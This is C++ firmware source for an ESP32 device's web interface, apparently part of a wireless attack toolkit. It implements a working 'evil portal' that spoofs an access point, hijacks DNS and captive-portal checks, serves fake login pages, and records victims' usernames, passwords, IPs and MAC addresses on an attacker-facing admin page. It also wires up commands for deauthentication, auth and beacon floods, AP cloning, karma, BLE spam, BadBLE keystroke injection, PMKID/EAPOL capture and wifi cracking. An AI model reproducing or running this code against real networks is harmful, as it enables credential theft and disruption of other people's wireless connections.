void WebUI::handlePMKIDData() {
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",pmkidPayload);
}
void WebUI::handlePMKIDExport() {
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.sendHeader("Content-Disposition","attachment; filename=capture.hc22000");
  server.send(200,"text/plain",pmkidExport);
}
void WebUI::handleTrackerData() {
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",trackerPayload);
}

void WebUI::handleBadBLEState() {
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",badBLEPayload);
}

void WebUI::handleStoredCreds() {
  extern CyberStorage cyberStorage;
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json", cyberStorage.getCredsJson());
}

void WebUI::handleOTAState() {
  extern OTAUpdate otaUpdate;
  bool ready = (WiFi.status()==WL_CONNECTED);
  String json = "{";
  json += "\"updating\":" + String(otaUpdate.isUpdating()?"true":"false") + ",";
  json += "\"progress\":" + String(otaUpdate.getProgress()) + ",";
  json += "\"ready\":" + String(ready?"true":"false");
  json += "}";
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",json);
}

void WebUI::handleFullState() {
  // Return statePayload plus runtime stats
  String json = statePayload;
  bool hasContent = (json.length() > 2);
  if(hasContent) {
    json = json.substring(0, json.length()-1); // remove trailing }
  } else {
    json = "{";
  }
  String sep = hasContent ? "," : "";
  json += sep + "\"heap\":" + String(ESP.getFreeHeap());
  json += ",\"ip\":\"" + WiFi.softAPIP().toString() + "\"";
  json += ",\"uptime\":" + String(millis());
  json += ",\"clients\":" + String(WiFi.softAPgetStationNum());
  json += ",\"bat\":" + String(_batPct);
  json += "}";
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",json);
}

void WebUI::handleEapolCaps() {
  extern EapolSniffer eapolSniffer;
  String json = "[";
  for(int i=0;i<eapolSniffer.getCaptureCount();i++){
    EapolCapture c = eapolSniffer.getCapture(i);
    if(i>0) json+=",";
    json+="{";
    json+="\"type\":"  + String(c.type)          + ",";
    json+="\"ch\":"    + String(c.channel)        + ",";
    json+="\"client\":\"" + c.clientMAC + "\",";
    json+="\"ap\":\"" + c.apMAC + "\"";
    json+="}";
  }
  json+="]";
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",json);
}

void WebUI::handleAPCScan() {
  extern APCloneSpam apCloneSpam;
  String json = "[";
  for(int i=0;i<apCloneSpam.getFoundCount();i++){
    CloneAP& ap = apCloneSpam.getAP(i);
    if(i>0) json+=",";
    json+="{";
    json+="\"idx\":"    + String(i)                          + ",";
    json+="\"ssid\":\""  + String(ap.ssid)                + "\",";
    json+="\"rssi\":"  + String(ap.rssi)                    + ",";
    json+="\"sel\":"   + String(ap.selected ? "true":"false");
    json+="}";
  }
  json+="]";
  server.sendHeader("Access-Control-Allow-Origin","*");
  server.send(200,"application/json",json);
}

void WebUI::handleAPCSelect() {
  extern APCloneSpam apCloneSpam;
  if(server.hasArg("plain")){
    DynamicJsonDocument doc(512);
    deserializeJson(doc, server.arg("plain"));
    if(doc.containsKey("all")){
      bool all=doc["all"];
      if(all) apCloneSpam.selectAll(); else apCloneSpam.clearSelection();
    } else if(doc.containsKey("idx")){
      int idx=doc["idx"];
      bool on=doc["on"]|true;
      apCloneSpam.select(idx,on);
    }
  }
  server.send(200,"application/json","{\"ok\":true}");
}

void WebUI::handle()              { server.handleClient(); }
void WebUI::stopServer()          { server.stop(); }

void WebUI::setPortalMode(bool active, int tplId) {
  _portalActive = active;
  _portalTplId  = tplId;

  if(active) {
    // Rename AP to fake SSID — main server keeps running on port 80
    // Dashboard still accessible at http://192.168.4.1/dashboard
    extern const char* EP_AP_NAMES[];
    const char* fakeSSID = EP_AP_NAMES[tplId];
    WiFi.softAP(fakeSSID, nullptr, 6, 0, 8);
    delay(300);
    Serial.printf("Portal: AP='%s' dashboard at /dashboard\n", fakeSSID);

    // DNS: redirect ALL queries to 192.168.4.1
    // This is what triggers the OS captive portal popup automatically
    _portalDns.setErrorReplyCode(DNSReplyCode::NoError);
    _portalDns.start(53, "*", WiFi.softAPIP());

    // Register portal-specific routes (safe to call multiple times)
    // Login credential capture
    server.on("/login", HTTP_POST, [this](){
      String user = server.hasArg("user") ? server.arg("user") : "";
      String pass = server.hasArg("pass") ? server.arg("pass") : "";
      String ip   = server.client().remoteIP().toString();
      String ua   = server.hasHeader("User-Agent") ? server.header("User-Agent") : "unknown";
      // MAC lookup via sequential DHCP assignment
      String mac = "unknown";
      wifi_sta_list_t sta; memset(&sta,0,sizeof(sta));
      if(esp_wifi_ap_get_sta_list(&sta)==ESP_OK && sta.num>0){
        int dot=ip.lastIndexOf('.');
        int sidx=dot>=0?ip.substring(dot+1).toInt()-2:0;
        if(sidx>=0&&sidx<(int)sta.num){
          uint8_t* m=sta.sta[sidx].mac; char mb[18];
          snprintf(mb,18,"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]);
          mac=String(mb);
        }
      }
      Serial.printf("PORTAL CRED: %s / %s  IP:%s  MAC:%s\n",
                    user.c_str(),pass.c_str(),ip.c_str(),mac.c_str());
      // Log connection
      bool seenConn=false;
      for(int i=0;i<_portalConnCount;i++) if(_portalConns[i].ip==ip){seenConn=true;break;}
      if(!seenConn && _portalConnCount<20){
        _portalConns[_portalConnCount++]={ip,mac,ua};
      }
      if(user.length()||pass.length()){
        // Store in RAM
        if(_portalCredCount<20)
          _portalCreds[_portalCredCount++]={user,pass,ip,mac};
        // Persist to flash
        cyberStorage.saveCred("portal", WiFi.softAPSSID(), user, pass, ip);
      }
      server.sendHeader("Location","/success",true);
      server.send(302,"text/plain","");
    });

    server.on("/success", HTTP_GET, [this](){
      server.send_P(200,"text/html",EP_OK);
    });

    // Captive portal detection - redirect everything to login
    auto redir = [this](){
      server.sendHeader("Location","http://192.168.4.1/",true);
      server.sendHeader("Cache-Control","no-cache");
      server.send(302,"text/plain","");
    };
    server.on("/hotspot-detect.html",       HTTP_GET, redir);
    server.on("/library/test/success.html", HTTP_GET, redir);
    server.on("/generate_204",              HTTP_GET, redir);
    server.on("/gen_204",                   HTTP_GET, redir);
    server.on("/connecttest.txt",           HTTP_GET, redir);
    server.on("/ncsi.txt",                  HTTP_GET, redir);
    server.on("/canonical.html",            HTTP_GET, redir);
    server.on("/redirect",                  HTTP_GET, redir);
    static const char* hdrs[] = {"User-Agent"};
    server.collectHeaders(hdrs, 1);

    // /admin — live view of connections + credentials (for the attacker)
    server.on("/admin", HTTP_GET, [this](){
      String h = "<!DOCTYPE html><html><head>"
        "<meta charset='utf-8'><meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<meta http-equiv='refresh' content='5'>"  // auto-refresh every 5s
        "<style>*{box-sizing:border-box}body{background:#111;color:#eee;"
        "font-family:monospace;padding:16px;max-width:960px;margin:0 auto}"
        "h2{color:#ff6b35;margin:0 0 4px}h3{color:#888;margin:14px 0 5px}"
        "table{width:100%;border-collapse:collapse;font-size:.82rem}"
        "th{color:#555;text-align:left;padding:4px 8px;border-bottom:2px solid #222}"
        "td{padding:4px 8px;border-bottom:1px solid #1a1a1a;word-break:break-all}"
        ".mac{color:#4fc3f7}.u{color:#a5d6a7}.p{color:#ef9a9a}.dim{color:#555}"
        "a{color:#ff6b35}</style></head><body>";
      h += "<h2>&#128274; Evil Portal Admin</h2>";
      h += "<p class='dim'>AP: <b style='color:#ffd54f'>" + WiFi.softAPSSID() + "</b>"
           " &nbsp;|&nbsp; <a href='/dashboard'>&#8594; Full Dashboard</a>"
           " &nbsp;|&nbsp; Auto-refresh 5s</p>";

      // Connected devices
      h += "<h3>CONNECTED DEVICES (" + String(_portalConnCount) + ")</h3>";
      if(_portalConnCount == 0){
        h += "<p class='dim'>Waiting...</p>";
      } else {
        h += "<table><tr><th>IP</th><th>MAC</th><th>Browser</th></tr>";
        for(int i=0;i<_portalConnCount;i++)
          h += "<tr><td>" + _portalConns[i].ip + "</td>"
               "<td class='mac'>" + _portalConns[i].mac + "</td>"
               "<td class='dim'>" + _portalConns[i].ua.substring(0,65) + "</td></tr>";
        h += "</table>";
      }

      // Captured creds
      h += "<h3>CAPTURED CREDENTIALS (" + String(_portalCredCount) + ")</h3>";
      if(_portalCredCount == 0){
        h += "<p class='dim'>Waiting...</p>";
      } else {
        h += "<table><tr><th>Username/Email</th><th>Password</th><th>IP</th><th>MAC</th></tr>";
        for(int i=0;i<_portalCredCount;i++)
          h += "<tr><td class='u'>" + _portalCreds[i].user + "</td>"
               "<td class='p'>" + _portalCreds[i].pass + "</td>"
               "<td>" + _portalCreds[i].ip + "</td>"
               "<td class='mac'>" + _portalCreds[i].mac + "</td></tr>";
        h += "</table>";
      }
      h += "</body></html>";
      server.send(200, "text/html", h);
    });

  } else {
    // Stop DNS, restore AP name
    _portalDns.stop();
    WiFi.softAP("ESP32-Cyber", "esp32cyber");
    delay(200);
    _portalConnCount = 0;
    Serial.println("Portal: stopped, AP restored to ESP32-Cyber");
  }
}

// Re-register the dashboard root route after evil portal releases it
void WebUI::registerRoot() {
  server.on("/", [this](){ handleRoot(); });
  // Also add /dashboard as permanent alias so it works during portal too
  server.on("/dashboard", [this](){ handleRoot(); });
}
String WebUI::getIP()             { return WiFi.softAPIP().toString(); }
bool WebUI::hasCommand()          { return cmdReady; }
WebCommandData WebUI::getCommand(){ cmdReady=false; return pendingCmd; }
void WebUI::setPinResult(bool ok) { pinResultReady=true; pinCorrect=ok; }

extern WiFiViewer wifiViewer;
void WebUI::pushState(
    String stateName,
    String ssid[], int wRssi[], int enc[], int chan[], int wCount,
    String bName[], String bAddr[], int bRssi[], int bCount,
    String netIP[], String netMAC[], int nCount,
    String apIP[], String apMAC[], int apCount,
    int portPorts[], String portSvcs[], int portCount, String portTarget,
    int chNets[], int chMax,
    int wSel, int bSel, int battery) {

  // Use DynamicJsonDocument for larger payloads
  DynamicJsonDocument doc(2048); // command payloads are small
  doc["state"]   = stateName;
  doc["battery"] = battery;

  JsonArray wa = doc.createNestedArray("wifi");
  for(int i=0;i<wCount;i++){
    JsonObject o=wa.createNestedObject();
    o["ssid"]=ssid[i]; o["rssi"]=wRssi[i];
    o["enc"]=enc[i];   o["channel"]=chan[i];
    o["wps"]=wifiViewer.hasWPS(i); o["mfr"]=wifiViewer.getManufacturer(i);
  }
  JsonArray ba = doc.createNestedArray("ble");
  for(int i=0;i<bCount;i++){
    JsonObject o=ba.createNestedObject();
    o["name"]=bName[i]; o["addr"]=bAddr[i]; o["rssi"]=bRssi[i];
  }
  JsonArray na = doc.createNestedArray("net");
  for(int i=0;i<nCount;i++){
    JsonObject o=na.createNestedObject();
    o["ip"]=netIP[i]; o["mac"]=netMAC[i];
  }
  JsonArray aa = doc.createNestedArray("ap");
  for(int i=0;i<apCount;i++){
    JsonObject o=aa.createNestedObject();
    o["ip"]=apIP[i]; o["mac"]=apMAC[i];
  }
  JsonArray pa = doc.createNestedArray("ports");
  for(int i=0;i<portCount;i++){
    JsonObject o=pa.createNestedObject();
    o["port"]=portPorts[i]; o["service"]=portSvcs[i];
  }
  // Channel data: array of 15 ints (index 0 unused, 1-13 = channel counts)
  JsonArray ca = doc.createNestedArray("ch");
  for(int c=0;c<15;c++) ca.add(chNets[c]);

  // Best/busiest channel
  int freeest=1, freeCnt=999, busiest=1, busyCnt=0;
  for(int c=1;c<=13;c++){
    if(c==1||c==6||c==11){if(chNets[c]<freeCnt){freeCnt=chNets[c];freeest=c;}}
    if(chNets[c]>busyCnt){busyCnt=chNets[c];busiest=c;}
  }
  doc["chBest"] = freeest;
  doc["chBusy"] = busiest;

  statePayload="";
  serializeJson(doc, statePayload);
}

void WebUI::handleRoot(){
  // If portal mode active, serve the fake login page to victims
  // Dashboard is still accessible at /dash for the attacker
  if(_portalActive){
    // Log this visit
    String ip  = server.client().remoteIP().toString();
    String ua  = server.hasHeader("User-Agent") ? server.header("User-Agent") : "unknown";
    String mac = "unknown";
    wifi_sta_list_t sta; memset(&sta,0,sizeof(sta));
    if(esp_wifi_ap_get_sta_list(&sta)==ESP_OK && sta.num>0){
      int dot=ip.lastIndexOf('.'); int sidx=dot>=0?ip.substring(dot+1).toInt()-2:0;
      if(sidx>=0&&sidx<(int)sta.num){
        uint8_t* m=sta.sta[sidx].mac; char mb[18];
        snprintf(mb,18,"%02X:%02X:%02X:%02X:%02X:%02X",m[0],m[1],m[2],m[3],m[4],m[5]);
        mac=String(mb);
      }
    }
    bool seen=false;
    for(int i=0;i<_portalConnCount;i++) if(_portalConns[i].ip==ip){seen=true;break;}
    if(!seen && _portalConnCount<20){
      _portalConns[_portalConnCount++]={ip,mac,ua};
      Serial.printf("Portal CONNECT: %s  MAC:%s\n",ip.c_str(),mac.c_str());
    }
    extern const char* EP_TEMPLATES[];
    server.send_P(200,"text/html", EP_TEMPLATES[_portalTplId]);
    return;
  }
  // Normal dashboard
  size_t total=0;
  total+=strlen_P(HTML1);
  total+=strlen_P(HTML2);
  total+=strlen_P(HTML3);
  total+=strlen_P(HTML4);
  total+=strlen_P(HTML5);
  server.setContentLength(total);
  server.send(200,"text/html","");
  server.sendContent_P(HTML1);
  server.sendContent_P(HTML2);
  server.sendContent_P(HTML3);
  server.sendContent_P(HTML4);
  server.sendContent_P(HTML5);
}

void WebUI::handleGetState(){
  if(statePayload.isEmpty())
    statePayload="{\"state\":\"lock\",\"wifi\":[],\"ble\":[],\"net\":[],\"ap\":[],\"ports\":[],\"ch\":[],\"battery\":0}";
  server.send(200,"application/json",statePayload);
}

void WebUI::handleCommand(){
  if(!server.hasArg("plain")){server.send(400);return;}
  DynamicJsonDocument doc(1024);
  // Deserialize first so we can read cmd and pin
  if(deserializeJson(doc,server.arg("plain"))){server.send(400);return;}
  String c   = doc["cmd"]    |"";
  int    idx = doc["index"]  |-1;
  String pin = doc["pin"]    |"";
  String tgt = doc["target"] |"";
  // Web UI PIN protection - skip for the lock-screen PIN command itself
  // PIN disabled — all commands accepted without authentication
  // Already read ssids/duration inside the atk_beacon_list block

  if(c=="pin"){
    pendingCmd={CMD_PIN,idx,pin};
    cmdReady=true;
    unsigned long t=millis();
    while(!pinResultReady&&millis()-t<300) delay(1);
    String resp=pinResultReady
      ?(pinCorrect?"{\"ok\":true,\"correct\":true}":"{\"ok\":true,\"correct\":false}")
      :"{\"ok\":true,\"correct\":false}";
    pinResultReady=false;
    server.send(200,"application/json",resp);
    return;
  }

  if     (c=="menu")          pendingCmd={CMD_GOTO_MENU,      idx,""};
  else if(c=="scan_wifi")     pendingCmd={CMD_SCAN_WIFI,       idx,""};
  else if(c=="scan_ble")      pendingCmd={CMD_SCAN_BLE,        idx,""};
  else if(c=="scan_net")      pendingCmd={CMD_SCAN_NET,        idx,""};
  else if(c=="ap_refresh")    pendingCmd={CMD_AP_REFRESH,      idx,""};
  else if(c=="ap_kick_all")   pendingCmd={CMD_AP_KICK_ALL,     idx,""};
  else if(c=="port_scan")     pendingCmd={CMD_PORT_SCAN,       idx,tgt};
  else if(c=="channel_analyse")pendingCmd={CMD_CHANNEL_ANALYSE,idx,""};
  else if(c=="goto_settings") pendingCmd={CMD_GOTO_SETTINGS,  idx,""};
  else if(c=="select_wifi")   pendingCmd={CMD_SELECT_WIFI,     idx,""};
  else if(c=="select_ble")    pendingCmd={CMD_SELECT_BLE,      idx,""};
  else if(c=="back")          pendingCmd={CMD_BACK,            idx,""};
  else if(c=="reboot")        pendingCmd={CMD_REBOOT,          idx,""};
  else if(c=="atk_beacon_list"){
    // Accept 'ssids' or 'strVal' — older JS code used strVal
    String ssids=doc["ssids"]|doc["strVal"]|"";
    int dur=doc["duration"]|15000;
    pendingCmd={CMD_ATK_BEACON_LIST, dur, ssids};
  }
  else if(c=="atk_beacon_random"){
    int dur=doc["duration"]|15000;
    pendingCmd={CMD_ATK_BEACON_RANDOM, dur, ""};
  }
  else if(c=="atk_evil_portal") pendingCmd={CMD_ATK_EVIL_PORTAL,  idx,""};
  else if(c=="atk_rick_roll"){
    int dur=doc["duration"]|30000;
    pendingCmd={CMD_ATK_RICK_ROLL,    dur, ""};
  }
  else if(c=="atk_probe_flood"){
    int dur=doc["duration"]|10000;
    pendingCmd={CMD_ATK_PROBE_FLOOD,  dur, ""};
  }
  else if(c=="atk_ap_clone_scan") pendingCmd={CMD_ATK_AP_CLONE_SCAN, idx,""};
  else if(c=="atk_ap_clone")      pendingCmd={CMD_ATK_AP_CLONE,      idx,""};
  else if(c=="atk_karma")         pendingCmd={CMD_ATK_KARMA,         idx,""};
  else if(c=="atk_karma_scan")    pendingCmd={CMD_ATK_KARMA_SCAN,    idx,""};
  else if(c=="atk_ble_spam")      pendingCmd={CMD_ATK_BLE_SPAM,      idx,""};
  else if(c=="atk_ble_spam_all")  pendingCmd={CMD_ATK_BLE_SPAM_ALL,  idx,""};
  else if(c=="atk_eapol")         pendingCmd={CMD_ATK_EAPOL,         idx,""};
  else if(c=="set_pin")           { pendingCmd.cmd=CMD_SET_PIN; pendingCmd.index=idx; pendingCmd.strVal=doc["strVal"]|""; }
  else if(c=="auth_flood_scan")    { pendingCmd.cmd=CMD_AUTH_FLOOD_SCAN; pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="auth_flood_all")     { pendingCmd.cmd=CMD_AUTH_FLOOD_ALL;  pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="auth_flood_sel")     { pendingCmd.cmd=CMD_AUTH_FLOOD_SEL;  pendingCmd.index=idx; pendingCmd.strVal=doc["strVal"]|""; }
  else if(c=="auth_flood_stop")    { pendingCmd.cmd=CMD_AUTH_FLOOD_STOP; pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="pmkid_start")        { pendingCmd.cmd=CMD_PMKID_START;     pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="pmkid_stop")         { pendingCmd.cmd=CMD_PMKID_STOP;      pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="airdrop_start")      { pendingCmd.cmd=CMD_AIRDROP_START;   pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="airdrop_stop")       { pendingCmd.cmd=CMD_AIRDROP_STOP;    pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="controller_spam")    { pendingCmd.cmd=CMD_CTRL_SPAM;       pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="controller_stop")    { pendingCmd.cmd=CMD_CTRL_STOP;       pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="scan_trackers")      { pendingCmd.cmd=CMD_SCAN_TRACKERS;   pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="name_spoof_start")   { pendingCmd.cmd=CMD_NAME_SPOOF_START;pendingCmd.index=idx; pendingCmd.strVal=doc["strVal"]|""; }
  else if(c=="name_spoof_stop")    { pendingCmd.cmd=CMD_NAME_SPOOF_STOP; pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="atk_beacon_stop")     { pendingCmd.cmd=CMD_ATK_BEACON_STOP; pendingCmd.index=-1; pendingCmd.strVal=""; }
  else if(c=="stop_all_attacks")   { pendingCmd.cmd=CMD_STOP_ALL;        pendingCmd.index=-1; pendingCmd.strVal=""; }
  else if(c=="deauth_scan")         { pendingCmd.cmd=CMD_DEAUTH_SCAN;     pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="deauth_all")          { pendingCmd.cmd=CMD_DEAUTH_ALL;      pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="deauth_selected")     { pendingCmd.cmd=CMD_DEAUTH_SEL;      pendingCmd.index=idx; pendingCmd.strVal=doc["strVal"]|""; }
  else if(c=="deauth_stop")         { pendingCmd.cmd=CMD_DEAUTH_STOP;     pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="station_scan_start")  { pendingCmd.cmd=CMD_STATION_SCAN_START; pendingCmd.index=-1; pendingCmd.strVal=""; }
  else if(c=="station_scan_stop")   { pendingCmd.cmd=CMD_STATION_SCAN_STOP;  pendingCmd.index=-1; pendingCmd.strVal=""; }
  else if(c=="probe_sniff_start")   { pendingCmd.cmd=CMD_PROBE_SNIFF_START;  pendingCmd.index=-1; pendingCmd.strVal=""; }
  else if(c=="probe_sniff_stop")    { pendingCmd.cmd=CMD_PROBE_SNIFF_STOP;   pendingCmd.index=-1; pendingCmd.strVal=""; }
  else if(c=="wardrive_start")      { pendingCmd.cmd=CMD_WARDRIVE_START;  pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="wardrive_stop")       { pendingCmd.cmd=CMD_WARDRIVE_STOP;   pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="wardrive_clear")      { pendingCmd.cmd=CMD_WARDRIVE_CLEAR;  pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="badble_start")        { pendingCmd.cmd=CMD_BADBLE_START; pendingCmd.index=idx; pendingCmd.strVal=doc["strVal"]|"Magic Keyboard"; }
  else if(c=="badble_stop")         { pendingCmd.cmd=CMD_BADBLE_STOP;  pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="badble_run")          { pendingCmd.cmd=CMD_BADBLE_RUN;   pendingCmd.index=idx; pendingCmd.strVal=doc["strVal"]|""; }
  else if(c=="ep_clear_creds")      { pendingCmd.cmd=CMD_EP_CLEAR;       pendingCmd.index=-1;  pendingCmd.strVal=""; }
  else if(c=="wifi_crack_start")    { pendingCmd.cmd=CMD_WIFI_CRACK_START;pendingCmd.index=-1;  pendingCmd.strVal=doc["strVal"]|""; }
  else if(c=="wifi_crack_stop")     { pendingCmd.cmd=CMD_WIFI_CRACK_STOP; pendingCmd.index=-1;  pendingCmd.strVal=""; }
  else if(c=="eapol_set_ch")       { pendingCmd.cmd=CMD_EAPOL_SET_CH;      pendingCmd.index=idx; pendingCmd.strVal=""; }
  else if(c=="eapol_targeted")     { pendingCmd.cmd=CMD_EAPOL_TARGETED;   pendingCmd.index=idx; pendingCmd.strVal=doc["strVal"]|""; }
  else if(c=="dns_start")           pendingCmd={CMD_DNS_START,        idx,""};
  else if(c=="dns_stop")            pendingCmd={CMD_DNS_STOP,         idx,""};
  else if(c=="clear_creds")         pendingCmd={CMD_CLEAR_CREDS,      idx,""};
  else if(c=="atk_ssid_conf")       pendingCmd={CMD_ATK_SSID_CONF,    idx,""};
  else if(c=="atk_pineapple")      pendingCmd={CMD_ATK_PINEAPPLE,     idx,""};
  else if(c=="atk_cc_scan")       pendingCmd={CMD_ATK_CC_SCAN,       idx,""};
  else if(c=="atk_cc_rickroll")   pendingCmd={CMD_ATK_CC_RICKROLL,   idx,""};
  else{server.send(400,"application/json","{\"ok\":false}");return;}

  cmdReady=true;
  server.send(200,"application/json","{\"ok\":true}");
}
